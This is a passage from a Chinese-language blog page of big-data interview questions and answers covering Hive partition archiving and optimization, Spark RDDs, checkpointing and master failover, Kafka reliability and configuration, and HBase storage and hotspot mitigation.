class="keyword">set</span> har.partfile.size=<span class="number">1099511627776</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用以下命令进行归档：</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> A <span class="keyword">ARCHIVE</span> <span class="keyword">PARTITION</span>(dt=<span class="string">'2021-05-07'</span>, hr=<span class="string">'12'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对已归档的分区恢复为原文件：</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> A UNARCHIVE <span class="keyword">PARTITION</span>(dt=<span class="string">'2021-05-07'</span>, hr=<span class="string">'12'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意:归档的分区可以查看不能 insert overwrite，必须先 unarchive</span></span><br></pre></td></tr></table></figure><h3 id="11、Hive优化有哪些">11、Hive优化有哪些</h3><ul><li><strong>数据存储及压缩</strong></li></ul><p>针对hive中表的存储格式通常有orc和parquet，压缩格式一般使用snappy。相比与textfile格式表，orc占有更少的存储。因为hive底层使用MR计算架构，数据流是hdfs到磁盘再到hdfs，而且会有很多次，所以使用orc数据格式和snappy压缩策略可以降低IO读写，还能降低网络传输量，这样在一定程度上可以节省存储，还能提升hql任务执行效率；</p><ul><li><strong>通过调参优化</strong></li></ul><p>并行执行，调节parallel参数；调节jvm参数，重用jvm；设置map、reduce的参数；开启strict mode模式；关闭推测执行设置</p><ul><li><strong>有效地减小数据集将大表拆分成子表；结合使用外部表和分区表</strong></li><li><strong>SQL优化</strong></li></ul><p>大表对大表：尽量减少数据集，可以通过分区表，避免扫描全表或者全字段；大表对小表：设置自动识别小表，将小表放入内存中去执行</p><h1>三、Spark大厂面试题</h1><h3 id="1、通常来说，Spark与MapReduce相比，Spark运行效率更高。请说明效率更高来源于Spark内置的哪些机制？">1、通常来说，Spark与MapReduce相比，Spark运行效率更高。请说明效率更高来源于Spark内置的哪些机制？</h3><p>spark是借鉴了Mapreduce,并在其基础上发展起来的，继承了其分布式计算的优点并进行了改进，spark生态更为丰富，功能更为强大，性能更加适用范围广，mapreduce更简单，稳定性好。主要区别：</p><ol><li>spark把运算的中间数据(shuffle阶段产生的数据)存放在内存，迭代计算效率更高，mapreduce的中间结果需要落地，保存到磁盘；</li><li>Spark容错性高，它通过弹性分布式数据集RDD来实现高效容错，RDD是一组分布式的存储在 节点内存中的只读性的数据集，这些集合是弹性的，某一部分丢失或者出错，可以通过整个数据集的计算流程的血缘关系来实现重建，mapreduce的容错只能重新计算；</li><li>Spark更通用，提供了transformation和action这两大类的多功能api，另外还有流式处理sparkstreaming模块、图计算等等，mapreduce只提供了map和reduce两种操作，流计算及其他的模块支持比较缺乏；</li><li>Spark框架和生态更为复杂，有RDD，血缘lineage、执行时的有向无环图DAG,stage划分等，很多时候spark作业都需要根据不同业务场景的需要进行调优以达到性能要求，mapreduce框架及其生态相对较为简单，对性能的要求也相对较弱，运行较为稳定，适合长期后台运行；</li><li>Spark计算框架对内存的利用和运行的并行度比mapreduce高，Spark运行容器为executor，内部ThreadPool中线程运行一个Task,mapreduce在线程内部运行container，container容器分类为MapTask和ReduceTask，程序运行并行度高；</li><li>Spark对于executor的优化，在JVM虚拟机的基础上对内存弹性利用：storage memory与Execution memory的弹性扩容，使得内存利用效率更高</li></ol><h3 id="2、hadoop和spark使用场景？">2、hadoop和spark使用场景？</h3><p>Hadoop/MapReduce和Spark最适合的都是做离线型的数据分析，但Hadoop特别适合是单次分析的数据量“很大”的情景，而Spark则适用于数据量不是很大的情景。</p><ol><li>一般情况下，对于中小互联网和企业级的大数据应用而言，单次分析的数量都不会“很大”，因此可以优先考虑使用Spark。</li><li>业务通常认为Spark更适用于机器学习之类的“迭代式”应用，80GB的压缩数据（解压后超过200GB），10个节点的集群规模，跑类似“sum+group-by”的应用，MapReduce花了5分钟，而spark只需要2分钟。</li></ol><h3 id="3、spark如何保证宕机迅速恢复">3、spark如何保证宕机迅速恢复?</h3><ol><li>适当增加spark standby master</li><li>编写shell脚本，定期检测master状态，出现宕机后对master进行重启操作</li></ol><h3 id="4、hadoop和spark的相同点和不同点？">4、hadoop和spark的相同点和不同点？</h3><p><strong>Hadoop底层使用MapReduce计算架构，只有map和reduce两种操作，表达能力比较欠缺，而且在MR过程中会重复的读写hdfs，造成大量的磁盘io读写操作</strong>，所以适合高时延环境下批处理计算的应用；</p><p><strong>Spark是基于内存的分布式计算架构，提供更加丰富的数据集操作类型，主要分成转化操作和行动操作</strong>，包括map、reduce、filter、flatmap、groupbykey、reducebykey、union和join等，数据分析更加快速，所以适合低时延环境下计算的应用；</p><p><strong>spark与hadoop最大的区别在于迭代式计算模型</strong>。基于mapreduce框架的Hadoop主要分为map和reduce两个阶段，两个阶段完了就结束了，所以在一个job里面能做的处理很有限；spark计算模型是基于内存的迭代式计算模型，可以分为n个阶段，根据用户编写的RDD算子和程序，在处理完一个阶段后可以继续往下处理很多个阶段，而不只是两个阶段。所以spark相较于mapreduce，计算模型更加灵活，可以提供更强大的功能。但是spark也有劣势，由于spark基于内存进行计算，虽然开发容易，但是真正面对大数据的时候，在没有进行调优的情况下，可能会出现各种各样的问题，比如OOM内存溢出等情况，导致spark程序可能无法运行起来，而mapreduce虽然运行缓慢，但是至少可以慢慢运行完。</p><h3 id="5、RDD持久化原理？">5、RDD持久化原理？</h3><p>spark非常重要的一个功能特性就是可以将RDD持久化在内存中。调用cache()和persist()方法即可。cache()和persist()的区别在于，cache()是persist()的一种简化方式，cache()的底层就是调用persist()的无参版本persist(MEMORY_ONLY)，将数据持久化到内存中。</p><p>如果需要从内存中清除缓存，可以使用unpersist()方法。RDD持久化是可以手动选择不同的策略的。在调用persist()时传入对应的StorageLevel即可。</p><h3 id="6、checkpoint检查点机制？">6、checkpoint检查点机制？</h3><p>应用场景：当spark应用程序特别复杂，从初始的RDD开始到最后整个应用程序完成有很多的步骤，而且整个应用运行时间特别长，这种情况下就比较适合使用checkpoint功能。</p><p>原因：对于特别复杂的Spark应用，会出现某个反复使用的RDD，即使之前持久化过但由于节点的故障导致数据丢失了，没有容错机制，所以需要重新计算一次数据。</p><p>Checkpoint首先会调用SparkContext的setCheckPointDIR()方法，设置一个容错的文件系统的目录，比如说HDFS；然后对RDD调用checkpoint()方法。之后在RDD所处的job运行结束之后，会启动一个单独的job，来将checkpoint过的RDD数据写入之前设置的文件系统，进行高可用、容错的类持久化操作。检查点机制是我们在spark streaming中用来保障容错性的主要机制，它可以使spark streaming阶段性的把应用数据存储到诸如HDFS等可靠存储系统中，以供恢复时使用。具体来说基于以下两个目的服务：</p><ol><li>控制发生失败时需要重算的状态数。Spark streaming可以通过转化图的谱系图来重算状态，检查点机制则可以控制需要在转化图中回溯多远。</li><li>提供驱动器程序容错。如果流计算应用中的驱动器程序崩溃了，你可以重启驱动器程序并让驱动器程序从检查点恢复，这样spark streaming就可以读取之前运行的程序处理数据的进度，并从那里继续</li></ol><h3 id="7、checkpoint和持久化机制的区别？">7、checkpoint和持久化机制的区别？</h3><p>最主要的区别在于持久化只是将数据保存在BlockManager中，但是RDD的lineage(血缘关系，依赖关系)是不变的。但是checkpoint执行完之后，rdd已经没有之前所谓的依赖rdd了，而只有一个强行为其设置的checkpointRDD，checkpoint之后rdd的lineage就改变了。</p><p>持久化的数据丢失的可能性更大，因为节点的故障会导致磁盘、内存的数据丢失。但是checkpoint的数据通常是保存在高可用的文件系统中，比如HDFS中，所以数据丢失可能性比较低</p><h3 id="8、RDD机制理解吗？">8、RDD机制理解吗？</h3><p>rdd分布式弹性数据集，简单的理解成一种数据结构，是spark框架上的通用货币。所有算子都是基于rdd来执行的，不同的场景会有不同的rdd实现类，但是都可以进行互相转换。rdd执行过程中会形成dag图，然后形成lineage保证容错性等。从物理的角度来看rdd存储的是block和node之间的映射。</p><p>RDD是spark提供的核心抽象，全称为弹性分布式数据集。RDD在逻辑上是一个hdfs文件，在抽象上是一种元素集合，包含了数据。它是被分区的，分为多个分区，每个分区分布在集群中的不同结点上，从而让RDD中的数据可以被并行操作（分布式数据集）。比如有个RDD有90W数据，3个partition，则每个分区上有30W数据。RDD通常通过Hadoop上的文件，即HDFS或者HIVE表来创建，还可以通过应用程序中的集合来创建；RDD最重要的特性就是容错性，可以自动从节点失败中恢复过来。即如果某个结点上的RDD partition因为节点故障，导致数据丢失，那么RDD可以通过自己的数据来源重新计算该partition。这一切对使用者都是透明的。</p><p><strong>RDD的数据默认存放在内存中，但是当内存资源不足时，spark会自动将RDD数据写入磁盘</strong>。比如某结点内存只能处理20W数据，那么这20W数据就会放入内存中计算，剩下10W放到磁盘中。RDD的弹性体现在于RDD上自动进行内存和磁盘之间权衡和切换的机制。</p><h3 id="9、Spark-streaming以及基本工作原理？">9、Spark streaming以及基本工作原理？</h3><p>Spark streaming是spark core API的一种扩展，可以用于进行大规模、高吞吐量、容错的实时数据流的处理。它支持从多种数据源读取数据，比如Kafka、Flume、Twitter和TCP Socket，并且能够使用算子比如map、reduce、join和window等来处理数据，处理后的数据可以保存到文件系统、数据库等存储中。</p><p>Spark streaming内部的基本工作原理是：接受实时输入数据流，然后将数据拆分成batch，比如每收集一秒的数据封装成一个batch，然后将每个batch交给spark的计算引擎进行处理，最后会生产处一个结果数据流，其中的数据也是一个一个的batch组成的。</p><h3 id="10、DStream以及基本工作原理？">10、DStream以及基本工作原理？</h3><p>DStream是spark streaming提供的一种高级抽象，代表了一个持续不断的数据流。DStream可以通过输入数据源来创建，比如Kafka、flume等，也可以通过其他DStream的高阶函数来创建，比如map、reduce、join和window等。DStream内部其实不断产生RDD，每个RDD包含了一个时间段的数据。</p><p>Spark streaming一定是有一个输入的DStream接收数据，按照时间划分成一个一个的batch，并转化为一个RDD，RDD的数据是分散在各个子节点的partition中。</p><h3 id="11、spark有哪些组件？">11、spark有哪些组件？</h3><ol><li>master：管理集群和节点，不参与计算。</li><li>worker：计算节点，进程本身不参与计算，和master汇报。</li><li>Driver：运行程序的main方法，创建spark context对象。</li><li>spark context：控制整个application的生命周期，包括dagsheduler和task scheduler等组件。</li><li>client：用户提交程序的入口。</li></ol><h3 id="12、spark工作机制？">12、spark工作机制？</h3><p>用户在client端提交作业后，会由Driver运行main方法并创建spark context上下文。执行add算子，形成dag图输入dagscheduler，按照add之间的依赖关系划分stage输入task scheduler。task scheduler会将stage划分为task set分发到各个节点的executor中执行。</p><h3 id="13、说下宽依赖和窄依赖">13、说下宽依赖和窄依赖</h3><ul><li><p>宽依赖：</p><p>本质就是shuffle。父RDD的每一个partition中的数据，都可能会传输一部分到下一个子RDD的每一个partition中，此时会出现父RDD和子RDD的partition之间具有交互错综复杂的关系，这种情况就叫做两个RDD之间是宽依赖。</p></li><li><p>窄依赖：</p><p>父RDD和子RDD的partition之间的对应关系是一对一的</p></li></ul><h3 id="14、Spark主备切换机制原理知道吗？">14、Spark主备切换机制原理知道吗？</h3><p>Master实际上可以配置两个，Spark原生的standalone模式是支持Master主备切换的。当Active Master节点挂掉以后，我们可以将Standby Master切换为Active Master。</p><p>Spark Master主备切换可以基于两种机制，一种是基于文件系统的，一种是基于ZooKeeper的。基于文件系统的主备切换机制，需要在Active Master挂掉之后手动切换到Standby Master上；而基于Zookeeper的主备切换机制，可以实现自动切换Master</p><h3 id="15、spark解决了hadoop的哪些问题？">15、spark解决了hadoop的哪些问题？</h3><ol><li><p><strong>MR</strong>：抽象层次低，需要使用手工代码来完成程序编写，使用上难以上手；</p><p><strong>Spark</strong>：Spark采用RDD计算模型，简单容易上手。</p></li><li><p><strong>MR</strong>：只提供map和reduce两个操作，表达能力欠缺；</p><p><strong>Spark</strong>：Spark采用更加丰富的算子模型，包括map、flatmap、groupbykey、reducebykey等；</p></li><li><p><strong>MR</strong>：一个job只能包含map和reduce两个阶段，复杂的任务需要包含很多个job，这些job之间的管理以来需要开发者自己进行管理；</p><p><strong>Spark</strong>：Spark中一个job可以包含多个转换操作，在调度时可以生成多个stage，而且如果多个map操作的分区不变，是可以放在同一个task里面去执行；</p></li><li><p><strong>MR</strong>：中间结果存放在hdfs中；</p><p><strong>Spark</strong>：Spark的中间结果一般存在内存中，只有当内存不够了，才会存入本地磁盘，而不是hdfs；</p></li><li><p><strong>MR</strong>：只有等到所有的map task执行完毕后才能执行reduce task；</p><p><strong>Spark</strong>：Spark中分区相同的转换构成流水线在一个task中执行，分区不同的需要进行shuffle操作，被划分成不同的stage需要等待前面的stage执行完才能执行。</p></li><li><p><strong>MR</strong>：只适合batch批处理，时延高，对于交互式处理和实时处理支持不够；</p><p><strong>Spark</strong>：Spark streaming可以将流拆成时间间隔的batch进行处理，实时计算。</p></li></ol><h3 id="16、数据倾斜的产生和解决办法？">16、数据倾斜的产生和解决办法？</h3><p>数据倾斜以为着某一个或者某几个partition的数据特别大，导致这几个partition上的计算需要耗费相当长的时间。在spark中同一个应用程序划分成多个stage，这些stage之间是串行执行的，而一个stage里面的多个task是可以并行执行，task数目由partition数目决定，如果一个partition的数目特别大，那么导致这个task执行时间很长，导致接下来的stage无法执行，从而导致整个job执行变慢。</p><p>避免数据倾斜，一般是要选用合适的key，或者自己定义相关的partitioner，通过加盐或者哈希值来拆分这些key，从而将这些数据分散到不同的partition去执行。如下算子会导致shuffle操作，是导致数据倾斜可能发生的关键点所在：groupByKey；reduceByKey；aggregaByKey；join；cogroup；</p><h3 id="17、你用sparksql处理的时候，-处理过程中用的dataframe还是直接写的sql？为什么？">17、你用sparksql处理的时候， 处理过程中用的dataframe还是直接写的sql？为什么？</h3><p>这个问题的宗旨是问你spark sql 中dataframe和sql的区别，从执行原理、操作方便程度和自定义程度来分析 这个问题</p><h3 id="18、RDD中reduceBykey与groupByKey哪个性能好，为什么">18、RDD中reduceBykey与groupByKey哪个性能好，为什么</h3><p><strong>reduceByKey</strong>：reduceByKey会在结果发送至reducer之前会对每个mapper在本地进行merge，有点类似于在MapReduce中的combiner。这样做的好处在于，在map端进行一次reduce之后，数据量会大幅度减小，从而减小传输，保证reduce端能够更快的进行结果计算。</p><p><strong>groupByKey</strong>：groupByKey会对每一个RDD中的value值进行聚合形成一个序列(Iterator)，此操作发生在reduce端，所以势必会将所有的数据通过网络进行传输，造成不必要的浪费。同时如果数据量十分大，可能还会造成OutOfMemoryError。</p><p>所以在进行大量数据的reduce操作时候建议使用reduceByKey。不仅可以提高速度，还可以防止使用groupByKey造成的内存溢出问题。</p><h3 id="19、Spark-master-HA主从切换过程不会影响到集群已有作业的运行，为什么">19、Spark master HA主从切换过程不会影响到集群已有作业的运行，为什么</h3><p>不会的。因为程序在运行之前，已经申请过资源了，driver和Executors通讯，不需要和master进行通讯的</p><h3 id="20、spark-master使用zookeeper进行ha，有哪些源数据保存到Zookeeper里面">20、spark master使用zookeeper进行ha，有哪些源数据保存到Zookeeper里面</h3><p>spark通过这个参数spark.deploy.zookeeper.dir指定master元数据在zookeeper中保存的位置，包括Worker，Driver和Application以及Executors。standby节点要从zk中，获得元数据信息，恢复集群运行状态，才能对外继续提供服务，作业提交资源申请等，在恢复前是不能接受请求的。</p><p>注：Master切换需要注意2点：</p><ul><li>在Master切换的过程中，所有的已经在运行的程序皆正常运行！ 因为Spark Application在运行前就已经通过Cluster Manager获得了计算资源，所以在运行时Job本身的 调度和处理和Master是没有任何关系。 </li><li>在Master的切换过程中唯一的影响是不能提交新的Job：一方面不能够提交新的应用程序给集群， 因为只有Active Master才能接受新的程序的提交请求；另外一方面，已经运行的程序中也不能够因 Action操作触发新的Job的提交请求。</li></ul><h1>四、Kafka大厂面试题</h1><h3 id="1、为什么要使用-kafka？">1、为什么要使用 kafka？</h3><ol><li>缓冲和削峰：上游数据时有突发流量，下游可能扛不住，或者下游没有足够多的机器来保证冗余，kafka在中间可以起到一个缓冲的作用，把消息暂存在kafka中，下游服务就可以按照自己的节奏进行慢慢处理。</li><li>解耦和扩展性：项目开始的时候，并不能确定具体需求。消息队列可以作为一个接口层，解耦重要的业务流程。只需要遵守约定，针对数据编程即可获取扩展能力。</li><li>冗余：可以采用一对多的方式，一个生产者发布消息，可以被多个订阅topic的服务消费到，供多个毫无关联的业务使用。</li><li>健壮性：消息队列可以堆积请求，所以消费端业务即使短时间死掉，也不会影响主要业务的正常进行。</li><li>异步通信：很多时候，用户不想也不需要立即处理消息。消息队列提供了异步处理机制，允许用户把一个消息放入队列，但并不立即处理它。想向队列中放入多少消息就放多少，然后在需要的时候再去处理它们</li></ol><h3 id="2、Kafka消费过的消息如何再消费？">2、Kafka消费过的消息如何再消费？</h3><p>kafka消费消息的offset是定义在zookeeper中的， 如果想重复消费kafka的消息，可以在redis中自己记录offset的checkpoint点（n个），当想重复消费消息时，通过读取redis中的checkpoint点进行zookeeper的offset重设，这样就可以达到重复消费消息的目的了</p><h3 id="3、kafka的数据是放在磁盘上还是内存上，为什么速度会快？">3、kafka的数据是放在磁盘上还是内存上，为什么速度会快？</h3><p>kafka使用的是磁盘存储。速度快是因为：</p><ol><li>顺序写入：因为硬盘是机械结构，每次读写都会寻址-&gt;写入，其中寻址是一个“机械动作”，它是耗时的。所以硬盘 “讨厌”随机I/O， 喜欢顺序I/O。为了提高读写硬盘的速度，Kafka就是使用顺序I/O</li><li>Memory Mapped Files（内存映射文件）：64位操作系统中一般可以表示20G的数据文件，它的工作原理是直接利用操作系统的Page来实现文件到物理内存的直接映射。完成映射之后你对物理内存的操作会被同步到硬盘上</li><li>Kafka高效文件存储设计： Kafka把topic中一个parition大文件分成多个小文件段，通过多个小文件段，就容易定期清除或删除已经消费完文件，减少磁盘占用。通过索引信息可以快速定位 message和确定response的 大 小。通过index元数据全部映射到memory（内存映射文件）， 可以避免segment file的IO磁盘操作。通过索引文件稀疏存储，可以大幅降低index文件元数据占用空间大小</li></ol><p><strong>注</strong>：</p><ol><li>Kafka解决查询效率的手段之一是将数据文件分段，比如有100条Message，它们的offset是从0到99。假设将数据文件分成5段，第一段为0-19，第二段为20-39，以此类推，每段放在一个单独的数据文件里面，数据文件以该段中 小的offset命名。这样在查找指定offset的 Message的时候，用二分查找就可以定位到该Message在哪个段中。</li><li>为数据文件建 索引数据文件分段 使得可以在一个较小的数据文件中查找对应offset的Message 了，但是这依然需要顺序扫描才能找到对应offset的Message。 为了进一步提高查找的效率，Kafka为每个分段后的数据文件建立了索引文件，文件名与数据文件的名字是一样的，只是文件扩展名为.index</li></ol><h3 id="4、Kafka数据怎么保障不丢失？">4、Kafka数据怎么保障不丢失？</h3><p>分三个点说，一个是生产者端，一个消费者端，一个broker端。</p><ol><li><strong>生产者数据的不丢失</strong></li></ol><p>kafka的ack机制：在kafka发送数据的时候，每次发送消息都会有一个确认反馈机制，确保消息正常的能够被收到，其中状态有0，1，-1。</p><p>如果是同步模式：<br>ack设置为0，风险很大，一般不建议设置为0。即使设置为1，也会随着leader宕机丢失数据。所以如果要严格保证生产端数据不丢失，可设置为-1。</p><p>如果是异步模式：<br>也会考虑ack的状态，除此之外，异步模式下的有个buffer，通过buffer来进行控制数据的发送，有两个值来进行控制，时间阈值与消息的数量阈值，如果buffer满了数据还没有发送出去，有个选项是配置是否立即清空buffer。可以设置为-1，永久阻塞，也就数据不再生产。异步模式下，即使设置为-1。也可能因为程序员的不科学操作，操作数据丢失，比如kill -9，但这是特别的例外情况。</p><blockquote><p>注：<br>ack=0：producer不等待broker同步完成的确认，继续发送下一条(批)信息。<br>ack=1（默认）：producer要等待leader成功收到数据并得到确认，才发送下一条message。<br>ack=-1：producer得到follwer确认，才发送下一条数据。</p></blockquote><ol><li><strong>消费者数据的不丢失</strong></li></ol><p>通过offset commit 来保证数据的不丢失，kafka自己记录了每次消费的offset数值，下次继续消费的时候，会接着上次的offset进行消费。而offset的信息在kafka0.8版本之前保存在zookeeper中，在0.8版本之后保存到topic中，即使消费者在运行过程中挂掉了，再次启动的时候会找到offset的值，找到之前消费消息的位置，接着消费，由于 offset 的信息写入的时候并不是每条消息消费完成后都写入的，所以这种情况有可能会造成重复消费，但是不会丢失消息。</p><p>唯一例外的情况是，我们在程序中给原本做不同功能的两个consumer组设置 KafkaSpoutConfig.bulider.setGroupid的时候设置成了一样的groupid，这种情况会导致这两个组共享同一份数据，就会产生组A消费partition1，partition2中的消息，组B消费partition3的消息，这样每个组消费的消息都会丢失，都是不完整的。 为了保证每个组都独享一份消息数据，groupid一定不要重复才行。</p><ol><li><strong>kafka集群中的broker的数据不丢失</strong></li></ol><p>每个broker中的partition我们一般都会设置有replication（副本）的个数，生产者写入的时候首先根据分发策略（有partition按partition，有key按key，都没有轮询）写入到leader中，follower（副本）再跟leader同步数据，这样有了备份，也可以保证消息数据的不丢失。</p><h3 id="5、采集数据为什么选择kafka？">5、采集数据为什么选择kafka？</h3><p>采集层 主要可以使用Flume, Kafka等技术。</p><p>Flume：Flume 是管道流方式，提供了很多的默认实现，让用户通过参数部署，及扩展API.</p><p>Kafka：Kafka是一个可持久化的分布式的消息队列。 Kafka 是一个非常通用的系统。你可以有许多生产者和很多的消费者共享多个主题Topics。</p><p>相比之下,Flume是一个专用工具被设计为旨在往HDFS，HBase发送数据。它对HDFS有特殊的优化，并且集成了Hadoop的安全特性。所以，Cloudera 建议如果数据被多个系统消费的话，使用kafka；如果数据被设计给Hadoop使用，使用Flume</p><h3 id="6、kafka-重启是否会导致数据丢失？">6、kafka 重启是否会导致数据丢失？</h3><ol><li>kafka是将数据写到磁盘的，一般数据不会丢失。</li><li>但是在重启kafka过程中，如果有消费者消费消息，那么kafka如果来不及提交offset，可能会造成数据的不准确（丢失或者重复消费）</li></ol><h3 id="7、kafka-宕机了如何解决？">7、kafka 宕机了如何解决？</h3><ol><li>先考虑业务是否受到影响</li></ol><p>kafka 宕机了，首先我们考虑的问题应该是所提供的服务是否因为宕机的机器而受到影响，如果服务提供没问题，如果实现做好了集群的容灾机制，那么这块就不用担心了。</p><ol><li>节点排错与恢复</li></ol><p>想要恢复集群的节点，主要的步骤就是通过日志分析来查看节点宕机的原因，从而解决，重新恢复节点</p><h3 id="8、为什么Kafka不支持读写分离？">8、为什么Kafka不支持读写分离？</h3><p>在 Kafka 中，生产者写入消息、消费者读取消息的操作都是与 leader 副本进行交互的，从 而实现的是一种<strong>主写主读</strong>的生产消费模型。 Kafka 并不支持<strong>主写从读</strong>，因为主写从读有 2 个很明显的缺点:</p><ol><li>数据一致性问题：数据从主节点转到从节点必然会有一个延时的时间窗口，这个时间 窗口会导致主从节点之间的数据不一致。某一时刻，在主节点和从节点中 A 数据的值都为 X， 之后将主节点中 A 的值修改为 Y，那么在这个变更通知到从节点之前，应用读取从节点中的 A 数据的值并不为最新的 Y，由此便产生了数据不一致的问题。</li><li>延时问题：类似 Redis 这种组件，数据从写入主节点到同步至从节点中的过程需要经历 网络→主节点内存→网络→从节点内存 这几个阶段，整个过程会耗费一定的时间。而在 Kafka 中，主从同步会比 Redis 更加耗时，它需要经历 网络→主节点内存→主节点磁盘→网络→从节 点内存→从节点磁盘 这几个阶段。对延时敏感的应用而言，主写从读的功能并不太适用。</li></ol><p>而kafka的<strong>主写主读</strong>的优点就很多了：</p><ol><li>可以简化代码的实现逻辑，减少出错的可能;</li><li>将负载粒度细化均摊，与主写从读相比，不仅负载效能更好，而且对用户可控;</li><li>没有延时的影响;</li><li>在副本稳定的情况下，不会出现数据不一致的情况</li></ol><h3 id="9、kafka数据分区和消费者的关系？">9、kafka数据分区和消费者的关系？</h3><p>每个分区只能由同一个消费组内的一个消费者(consumer)来消费，可以由不同的消费组的消费者来消费，同组的消费者则起到并发的效果</p><h3 id="10、kafka的数据offset读取流程">10、kafka的数据offset读取流程</h3><ol><li>连接ZK集群，从ZK中拿到对应topic的partition信息和partition的Leader的相关信息</li><li>连接到对应Leader对应的broker</li><li>consumer将⾃自⼰己保存的offset发送给Leader</li><li>Leader根据offset等信息定位到segment（索引⽂文件和⽇日志⽂文件）</li><li>根据索引⽂文件中的内容，定位到⽇日志⽂文件中该偏移量量对应的开始位置读取相应⻓长度的数据并返回给consumer</li></ol><h3 id="11、kafka内部如何保证顺序，结合外部组件如何保证消费者的顺序？">11、kafka内部如何保证顺序，结合外部组件如何保证消费者的顺序？</h3><p>kafka只能保证partition内是有序的，但是partition间的有序是没办法的。爱奇艺的搜索架构，是从业务上把需要有序的打到同⼀个partition</p><h3 id="12、Kafka消息数据积压，Kafka消费能力不足怎么处理？">12、Kafka消息数据积压，Kafka消费能力不足怎么处理？</h3><ol><li>如果是Kafka消费能力不足，则可以考虑增加Topic的分区数，并且同时提升消费组的消费者数量，消费者数=分区数。（两者缺一不可）</li><li>如果是下游的数据处理不及时：提高每批次拉取的数量。批次拉取数据过少（拉取数据/处理时间&lt;生产速度），使处理的数据小于生产的数据，也会造成数据积压</li></ol><h3 id="13、Kafka单条日志传输大小">13、Kafka单条日志传输大小</h3><p>kafka对于消息体的大小默认为单条最大值是1M但是在我们应用场景中, 常常会出现一条消息大于1M，如果不对kafka进行配置。则会出现生产者无法将消息推送到kafka或消费者无法去消费kafka里面的数据, 这时我们就要对kafka进行以下配置：server.properties</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">replica.fetch.max.bytes: 1048576  <span class="comment">#broker可复制的消息的最大字节数, 默认为1M</span></span><br><span class="line">message.max.bytes: 1000012   <span class="comment">#kafka 会接收单个消息size的最大限制， 默认为1M左右</span></span><br></pre></td></tr></table></figure><p><strong>注意：message.max.bytes必须小于等于replica.fetch.max.bytes，否则就会导致replica之间数据同步失败。</strong></p><h1>五、HBase 大厂面试题</h1><h2 id="1、Hbase是怎么写数据的">1、Hbase是怎么写数据的</h2><p>Client写入 -&gt; 存入MemStore，一直到MemStore满 -&gt; Flush成一个StoreFile，直至增长到一定阈值 -&gt; 触发Compact合并操作 -&gt; 多个StoreFile合并成一个StoreFile，同时进行版本合并和数据删除 -&gt; 当StoreFiles Compact后，逐步形成越来越大的StoreFile -&gt; 单个StoreFile大小超过一定阈值后（默认10G），触发Split操作，把当前Region Split成2个Region，Region会下线，新Split出的2个孩子Region会被HMaster分配到相应的HRegionServer 上，使得原先1个Region的压力得以分流到2个Region上</p><p>由此过程可知，HBase只是增加数据，没有更新和删除操作，用户的更新和删除都是逻辑层面的，在物理层面，更新只是追加操作，删除只是标记操作。用户写操作只需要进入到内存即可立即返回，从而保证I/O高性能</p><h2 id="2、HDFS和HBase各自使用场景">2、HDFS和HBase各自使用场景</h2><p>首先一点需要明白：Hbase是基于HDFS来存储的。</p><p>HDFS：</p><ol><li>一次性写入，多次读取。</li><li>保证数据的一致性。</li><li>主要是可以部署在许多廉价机器中，通过多副本提高可靠性，提供了容错和恢复机制。</li></ol><p>HBase：</p><ol><li>瞬间写入量很大，数据库不好支撑或需要很高成本支撑的场景。</li><li>数据需要长久保存，且量会持久增长到比较大的场景。</li><li>HBase不适用与有 join，多级索引，表关系复杂的数据模型。</li><li>大数据量（100s TB级数据）且有快速随机访问的需求。如：淘宝的交易历史记录。数据量巨大无容置疑，面向普通用户的请求必然要即时响应。</li><li>业务场景简单，不需要关系数据库中很多特性（例如交叉列、交叉表，事务，连接等等）</li></ol><h2 id="3、Hbase的存储结构">3、Hbase的存储结构</h2><p>Hbase 中的每张表都通过行键(rowkey)按照一定的范围被分割成多个子表（HRegion），默认一个HRegion 超过256M 就要被分割成两个，由HRegionServer管理，管理哪些 HRegion 由 Hmaster 分配。 HRegion 存取一个子表时，会创建一个 HRegion 对象，然后对表的每个列族（Column Family）创建一个 store 实例， 每个 store 都会有 0 个或多个 StoreFile 与之对应，每个 StoreFile 都会对应一个HFile，HFile 就是实际的存储文件，一个 HRegion 还拥有一个 MemStore实例</p><h2 id="4、热点现象（数据倾斜）怎么产生的，以及解决方法有哪些">4、热点现象（数据倾斜）怎么产生的，以及解决方法有哪些</h2><p><strong>热点现象</strong>：</p><p>某个小的时段内，对HBase的读写请求集中到极少数的Region上，导致这些region所在的RegionServer处理请求量骤增，负载量明显偏大，而其他的RgionServer明显空闲。</p><p><strong>热点现象出现的原因</strong>：</p><p>HBase中的行是按照rowkey的字典顺序排序的，这种设计优化了scan操作，可以将相关的行以及会被一起读取的行存取在临近位置，便于scan。然而糟糕的rowkey设计是热点的源头。</p><p>热点发生在大量的client直接访问集群的一个或极少数个节点（访问可能是读，写或者其他操作）。大量访问会使热点region所在的单个机器超出自身承受能力，引起性能下降甚至region不可用，这也会影响同一个RegionServer上的其他region，由于主机无法服务其他region的请求。</p><p><strong>热点现象解决办法</strong>：</p><p>为了避免写热点，设计rowkey使得不同行在同一个region，但是在更多数据情况下，数据应该被写入集群的多个region，而不是一个。常见的方法有以下这些：</p><ol><li><strong>加盐</strong>：在rowkey的前面增加随机数，使得它和之前的rowkey的开头不同。分配的前缀种类数量应该和你想使用数据分散到不同的region的数量一致。加盐之后的rowkey就会根据随机生成的前缀分散到各个region上，以避免热点。</li><li><strong>哈希</strong>：哈希可以使负载分散到整个集群，但是读却是可以预测的。使用确定的哈希可以让客户端重构完整的rowkey，可以使用get操作准确获取某一个行数据</li><li><strong>反转</strong>：第三种防止热点的方法时反转固定长度或者数字格式的rowkey。这样可以使得rowkey中经常改变的部分（最没有意义的部分）放在前面。这样可以有效的随机rowkey，但是牺牲了rowkey的有序性。反转rowkey的例子以手机号为rowkey，可以将手机号反转后的字符串作为rowkey，这样的就避免了以手机号那样比较固定开头导致热点问题</li><li><strong>时间戳反转</strong>：一个常见的数据处理问题是快速获取数据的最近版本，使用反转的时间戳作为rowkey的一部分对这个问题十分有用，可以用 Long.Max_Value - timestamp 追加到key的末尾，例如[key][reverse_timestamp],[key]的最新值可以通过scan 